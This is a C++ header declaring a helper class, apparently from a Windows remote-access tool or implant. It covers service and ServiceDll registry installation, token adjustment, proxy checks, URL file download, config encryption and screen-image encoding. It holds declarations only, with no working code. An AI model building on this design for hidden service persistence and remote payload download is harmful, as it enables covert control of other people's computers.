// MyMainFunc.h: interface for the MyMainFunc class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYMAINFUNC_H__D28C3CBF_CA2A_422F_9219_33B8C7E10917__INCLUDED_)
#define AFX_MYMAINFUNC_H__D28C3CBF_CA2A_422F_9219_33B8C7E10917__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class MyMainFunc  
{
public:
	MyMainFunc();
	virtual ~MyMainFunc();

	void static BcdToAsc(BYTE* BcdStr, BYTE* AscStr, int Bcdlstrlen);
	BOOL static GetMyFile(char* pFileName, DWORD nCmd, PSDLLINFO m_Info);
	void static CheckProxy(char* pProxyAddr, DWORD* pProxyPort);
	void static MakeService(LPPSDLLINFO pInfo);
	void static ModifyService(LPCTSTR ServiceName, LPCTSTR ServiceTitle);
	void static MyRegSetKeyGroup(LPCTSTR AppName);
	void static MyRegSetKeyDescription(TCHAR* pKeyName, LPCTSTR m_KeyValue);
	void static MyRegSetKeyStart(TCHAR* pKeyName, DWORD m_KeyValue);
	void static MyRegSetKeyServiceDll(TCHAR* pKeyName, TCHAR* Value);
	int  static DeleteMyService(LPCTSTR ServiceName);
	int  static InstallMyService(LPCTSTR ServiceName, LPCTSTR ServiceView);
	void static StartMyService(LPCTSTR ServiceName);
	int  static GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
	BOOL static IsProcessExit(DWORD nProcessId);
	BOOL static MyWriteFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen);
	BOOL static MyReadFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen);
	void static GetMyToken();
	void static GetMoudleMame(DWORD pId, TCHAR* pExeName);
	BOOL static MyGetKeyStr(HKEY hKey, LPCTSTR Title, LPCTSTR KeyName, BYTE* KeyValue);
	BOOL static GetFileSaveInfo(LPVOID pInfoData, DWORD nInfoLen);
	void static EncryptByte(LPVOID pData, DWORD nLen);
	BOOL static GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue);
	BOOL static GetUrlFile(char* pUrlPath, char* m_FilePath);
};

#endif // !defined(AFX_MYMAINFUNC_H__D28C3CBF_CA2A_422F_9219_33B8C7E10917__INCLUDED_)
